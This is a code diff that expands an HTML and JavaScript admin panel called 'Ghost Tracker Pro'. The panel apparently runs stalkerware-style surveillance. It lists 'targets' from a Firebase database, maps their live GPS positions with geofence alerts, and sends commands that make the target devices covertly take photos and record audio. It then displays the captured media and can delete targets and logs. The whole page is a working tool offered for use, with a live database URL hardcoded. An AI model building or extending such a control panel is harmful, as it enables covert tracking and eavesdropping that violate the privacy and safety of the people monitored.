@@ -1,73 +1,178 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Global Tracking Admin</title>
+    <title>Ghost Admin Pro - v3.5 (Auto-Time)</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; display: flex; height: 100vh; }
-        .sidebar { width: 300px; background: #fff; border-right: 1px solid #ddd; padding: 15px; }
-        .main { flex: 1; padding: 20px; display: flex; flex-direction: column; }
-        .target-card { padding: 15px; border: 1px solid #eee; margin-bottom: 10px; cursor: pointer; border-radius: 8px; transition: 0.3s; }
-        .target-card.active { border-left: 5px solid #1a73e8; background: #e8f0fe; }
-        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .online { background: #1e8e3e; box-shadow: 0 0 8px #1e8e3e; }
-        .offline { background: #9aa0a6; }
-        .map-box { flex: 1; background: #fff; border-radius: 12px; border: 1px solid #ddd; overflow: hidden; margin-bottom: 20px; }
-        .controls { display: flex; gap: 10px; }
-        button { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #fff; }
-        .btn-blue { background: #1a73e8; }
-        .btn-red { background: #d93025; }
+        body { display: flex; height: 100vh; margin: 0; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
+        #side { width: 320px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; background: #050505; }
+        #main { flex-grow: 1; display: flex; flex-direction: column; }
+        #map { height: 45%; border-bottom: 1px solid #0f0; }
+        #output { height: 55%; overflow-y: auto; padding: 15px; background: #000; }
+        
+        .target-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; cursor: pointer; position: relative; transition: 0.3s; }
+        .target-card:hover { border-color: #0f0; background: #0a0a0a; }
+        
+        .status-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
+        .online-tag { color: #0f0; font-weight: bold; font-size: 10px; text-shadow: 0 0 5px #0f0; }
+        .offline-tag { color: #555; font-size: 10px; }
+
+        .controls { margin-top: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
+        button { background: #0f0; color: #000; border: none; padding: 6px; font-weight: bold; cursor: pointer; font-size: 11px; }
+        button:active { transform: scale(0.95); }
+        button.del { background: #ff0000; color: #fff; margin-top: 8px; width: 100%; opacity: 0.7; }
+        button.del:hover { opacity: 1; }
+
+        .img-box { display: inline-block; margin: 5px; border: 1px solid #555; position: relative; vertical-align: top; }
+        .img-box img { width: 120px; display: block; height: auto; }
+        .del-btn-small { position: absolute; top: 0; right: 0; background: red; color: white; border: none; cursor: pointer; font-size: 10px; padding: 2px 5px; }
+        
+        .alert-box { background: #500; color: white; padding: 3px; text-align: center; font-size: 10px; margin-top: 5px; border-radius: 2px; }
+        h4 { margin: 15px 0 5px 0; border-bottom: 1px solid #333; padding-bottom: 5px; color: #0ff; }
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <h2>Targets</h2>
-        <div id="targetList">Connecting...</div>
+    <div id="side">
+        <h3 style="text-align:center; border-bottom: 1px solid #0f0; padding-bottom: 10px; color: #0f0;">GHOST TRACKER PRO</h3>
+        <div id="userList">Waiting for connection...</div>
     </div>
-    <div class="main">
-        <h2 id="activeName">Select a target to track</h2>
-        <div class="map-box">
-            <iframe id="mapFrame" width="100%" height="100%" frameborder="0"></iframe>
-        </div>
-        <div class="controls">
-            <button class="btn-blue" onclick="sendCommand('snap')">📸 TAKE PHOTO</button>
-            <button class="btn-red" onclick="sendCommand('mic')">🎙️ RECORD AUDIO</button>
+    <div id="main">
+        <div id="map"></div>
+        <div id="output">
+            <div id="feedHeader"><h3>LIVE DATA FEED (Select Target)</h3></div>
+            <div id="photosGrid"></div>
+            <div id="audioGrid"></div>
         </div>
     </div>
 
     <script>
+        // --- Firebase Config ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        let selectedId = null;
+        
+        // --- Map Setup ---
+        var map = L.map('map').setView([24.8607, 67.0011], 15);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        
+        // Geofencing Circle (500m)
+        const home = { lat: 24.8607, lng: 67.0011, radius: 500 }; 
+        L.circle([home.lat, home.lng], { radius: home.radius, color: 'blue', weight: 1, fillOpacity: 0.1 }).addTo(map);
 
-        db.ref('targets').on('value', (snap) => {
-            const list = document.getElementById('targetList');
-            list.innerHTML = '';
-            snap.forEach((child) => {
-                const id = child.key;
-                const loc = child.val().location;
-                const isOnline = (Date.now() - loc.last_seen) < 15000;
+        var markers = {};
+        var selectedUser = "";
+
+        // --- Main Listener ---
+        db.ref('targets').on('value', snap => {
+            const list = document.getElementById('userList');
+            list.innerHTML = "";
+            const serverTime = Date.now(); 
+
+            snap.forEach(user => {
+                const id = user.key;
+                const data = user.val();
+                if(!data.location) return;
+
+                // Online/Offline Logic (30 seconds gap)
+                const lastSeen = data.location.last_seen || 0;
+                const isOnline = (serverTime - lastSeen) < 30000; 
+
+                // Geofence Calculation
+                const dist = getDist(home.lat, home.lng, data.location.lat, data.location.lng) * 1000;
+                const isOut = dist > home.radius;
+
+                // Build User Card
+                const card = document.createElement('div');
+                card.className = "target-card";
+                card.style.borderLeft = isOnline ? "5px solid #0f0" : "5px solid #555";
                 
-                const div = document.createElement('div');
-                div.className = `target-card ${selectedId === id ? 'active' : ''}`;
-                div.onclick = () => {
-                    selectedId = id;
-                    document.getElementById('activeName').innerText = "Live: " + id;
-                    document.getElementById('mapFrame').src = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
+                card.innerHTML = `
+                    <div class="status-header">
+                        <b>${id}</b>
+                        <span class="${isOnline ? 'online-tag' : 'offline-tag'}">
+                            ${isOnline ? '● ONLINE' : '○ OFFLINE'}
+                        </span>
+                    </div>
+                    <small style="color:#aaa;">Last: ${data.location.timestamp}</small>
+                    ${isOut ? '<div class="alert-box">⚠️ OUT OF BOUNDARY</div>' : ''}
+                    <div class="controls">
+                        <button onclick="sendCmd('${id}', 'snap')">📸 PHOTO</button>
+                        <button onclick="sendCmd('${id}', 'mic')">🎙️ AUDIO</button>
+                    </div>
+                    <button class="del" onclick="deleteFullUser('${id}')">🗑️ DELETE TARGET</button>
+                `;
+                
+                card.onclick = (e) => { 
+                    if(e.target.tagName !== 'BUTTON') {
+                        selectedUser = id; 
+                        map.setView([data.location.lat, data.location.lng], 18); 
+                        loadUserFeed(id); 
+                    }
                 };
-                div.innerHTML = `<span class="status-dot ${isOnline ? 'online' : 'offline'}"></span><b>${id}</b>`;
-                list.appendChild(div);
+                list.appendChild(card);
+
+                // Update Map Markers
+                if(!markers[id]) markers[id] = L.marker([data.location.lat, data.location.lng]).addTo(map).bindPopup(id);
+                else markers[id].setLatLng([data.location.lat, data.location.lng]);
             });
         });
 
-        function sendCommand(act) {
-            if(!selectedId) return alert("Target select karein!");
-            db.ref('commands/' + selectedId).set({ action: act, time: Date.now() });
-            alert("Command Sent!");
+        // --- Commands & Feeds ---
+        function sendCmd(id, act) { 
+            db.ref('commands/' + id).set({ action: act, time: Date.now() }); 
+            alert("Command Sent to " + id); 
+        }
+
+        function loadUserFeed(id) {
+            document.getElementById('feedHeader').innerHTML = `<h3>FEED: ${id} <button onclick="clearAllFeed('${id}')" style="background:orange; color:black; font-size:10px; float:right;">Clear Media</button></h3>`;
+            const pGrid = document.getElementById('photosGrid');
+            const aGrid = document.getElementById('audioGrid');
+            
+            // Listen for Photos
+            db.ref(`targets/${id}/photos`).off(); // Remove old listeners
+            db.ref(`targets/${id}/photos`).on('value', s => {
+                pGrid.innerHTML = "<h4>Captured Photos:</h4>";
+                if(!s.exists()) pGrid.innerHTML += "<small>No photos yet.</small>";
+                s.forEach(p => {
+                    pGrid.innerHTML += `<div class="img-box">
+                        <img src="${p.val().image}">
+                        <button class="del-btn-small" onclick="deleteEntry('${id}', 'photos', '${p.key}')">X</button>
+                        <small style="font-size:8px;">${p.val().type} | ${p.val().time}</small>
+                    </div>`;
+                });
+            });
+
+            // Listen for Audio
+            db.ref(`targets/${id}/audio`).off();
+            db.ref(`targets/${id}/audio`).on('value', s => {
+                aGrid.innerHTML = "<h4>Audio Recordings:</h4>";
+                if(!s.exists()) aGrid.innerHTML += "<small>No audio yet.</small>";
+                s.forEach(a => {
+                    aGrid.innerHTML += `<div style="margin-bottom:10px; background:#111; padding:5px; border:1px solid #333;">
+                        <small>🎙️ ${a.val().time}</small><br>
+                        <audio controls src="${a.val().data}" style="height:30px; width:200px;"></audio>
+                        <button onclick="deleteEntry('${id}', 'audio', '${a.key}')" style="color:red; background:none; border:none; cursor:pointer; font-size:10px;">[Del]</button>
+                    </div>`;
+                });
+            });
+        }
+
+        // --- Management Functions ---
+        function deleteEntry(uid, type, key) { if(confirm("Delete this item?")) db.ref(`targets/${uid}/${type}/${key}`).remove(); }
+        
+        function clearAllFeed(uid) { if(confirm("Clear all media for this user?")) { db.ref(`targets/${uid}/photos`).remove(); db.ref(`targets/${uid}/audio`).remove(); } }
+        
+        function deleteFullUser(uid) { if(confirm("⚠️ WARNING: Permanently delete this user and all logs?")) db.ref(`targets/${uid}`).remove(); }
+
+        function getDist(l1, n1, l2, n2) {
+            const R = 6371; const dL = (l2-l1)*Math.PI/180; const dN = (n2-n1)*Math.PI/180;
+            const a = Math.sin(dL/2)**2 + Math.cos(l1*Math.PI/180)*Math.cos(l2*Math.PI/180)*Math.sin(dN/2)**2;
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
         }
     </script>
 </body>
 </html>
+
